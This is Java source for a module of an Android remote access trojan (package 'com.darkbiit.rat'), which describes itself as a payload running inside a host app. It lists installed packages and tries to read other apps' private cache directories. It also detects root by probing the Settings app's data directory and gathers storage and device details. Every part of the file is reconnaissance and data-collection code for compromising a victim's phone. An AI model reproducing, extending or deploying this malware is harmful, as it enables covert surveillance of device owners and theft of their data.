package com.darkbiit.rat;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;

import java.io.File;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Access to application caches.
 *
 * On a normal (non-rooted) device an app can only read its own private
 * directory. Another app's cache under /data/data/<pkg>/cache is protected
 * by the per-app UID and the "cache" group, so the payload cannot read it
 * directly.
 *
 * What IS reachable without root:
 *   - the host app's own cache (the payload runs inside it)
 *   - the host app's external cache dir (getExternalCacheDir)
 *   - external storage paths of other apps that expose them
 *   - the list of installed packages (subject to package visibility)
 *
 * On a rooted device, or when the payload itself runs as root, the other
 * apps' caches become reachable; the code tries them and reports the exact
 * permission error otherwise instead of pretending it worked.
 */
public final class RatAppCache {

    private RatAppCache() {
    }

    /** Lists the caches that are reachable, with the reason for the rest. */
    public static Map<String, Object> list(Context ctx) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        out.put("ok", true);
        out.put("self", selfCaches(ctx));
        out.put("other_apps", otherAppCaches(ctx, 60));
        out.put("rooted", isRoot());
        out.put("note", "other apps' private caches are only readable when the "
                + "device is rooted or the payload runs with root privileges");
        return out;
    }

    /** The host app's own cache directories. */
    public static Map<String, Object> selfCaches(Context ctx) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        try {
            File files = ctx.getFilesDir();
            File cache = ctx.getCacheDir();
            File ext = ctx.getExternalCacheDir();
            File extFiles = ctx.getExternalFilesDir(null);
            m.put("files", files != null ? files.getAbsolutePath() : null);
            m.put("cache", cache != null ? cache.getAbsolutePath() : null);
            m.put("external_cache", ext != null ? ext.getAbsolutePath() : null);
            m.put("external_files", extFiles != null ? extFiles.getAbsolutePath() : null);
            m.put("cache_entries", cache != null ? listDir(cache) : null);
        } catch (Throwable t) {
            m.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
        return m;
    }

    /**
     * Attempts to read the cache directory of other installed packages.
     * Most will fail with EACCES; the error is reported per package.
     */
    public static List<Object> otherAppCaches(Context ctx, int limit) {
        List<Object> out = new ArrayList<Object>();
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> infos = pm.getInstalledApplications(0);
            int n = 0;
            for (ApplicationInfo ai : infos) {
                if (n++ >= limit) {
                    break;
                }
                if (ai.packageName.equals(ctx.getPackageName())) {
                    continue;
                }
                Map<String, Object> one = new LinkedHashMap<String, Object>();
                one.put("package", ai.packageName);
                File cache = new File(ai.dataDir, "cache");
                one.put("path", cache.getAbsolutePath());
                one.put("exists", cache.exists());
                one.put("readable", cache.canRead());
                if (cache.canRead()) {
                    one.put("entries", listDir(cache));
                }
                out.add(one);
            }
        } catch (Throwable t) {
            Map<String, Object> one = new LinkedHashMap<String, Object>();
            one.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
            out.add(one);
        }
        return out;
    }

    /** Reads a directory listing with size and mtime. */
    public static List<Object> listDir(File dir) {
        List<Object> out = new ArrayList<Object>();
        File[] arr = dir.listFiles();
        if (arr == null) {
            return out;
        }
        int n = 0;
        for (File f : arr) {
            if (n++ >= 500) {
                break;
            }
            Map<String, Object> one = new LinkedHashMap<String, Object>();
            one.put("name", f.getName());
            one.put("dir", f.isDirectory());
            one.put("size", f.length());
            one.put("mtime", f.lastModified());
            out.add(one);
        }
        return out;
    }

    /** True when the payload can read files outside its own sandbox. */
    public static boolean isRoot() {
        try {
            // A root shell can read another app's data dir; a normal app
            // cannot. Probing a directory we must not own is the check.
            File probe = new File("/data/data/com.android.settings/cache");
            return probe.canRead();
        } catch (Throwable t) {
            return false;
        }
    }

    /** Device-level information about the storage layout. */
    public static Map<String, Object> storageInfo(Context ctx) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        try {
            android.os.StatFs fs = new android.os.StatFs("/data");
            m.put("data_total", fs.getTotalBytes());
            m.put("data_free", fs.getAvailableBytes());
            android.os.StatFs es = new android.os.StatFs(
                    android.os.Environment.getExternalStorageDirectory().getAbsolutePath());
            m.put("external_total", es.getTotalBytes());
            m.put("external_free", es.getAvailableBytes());
            m.put("sdk", Build.VERSION.SDK_INT);
        } catch (Throwable t) {
            m.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
        return m;
    }
}
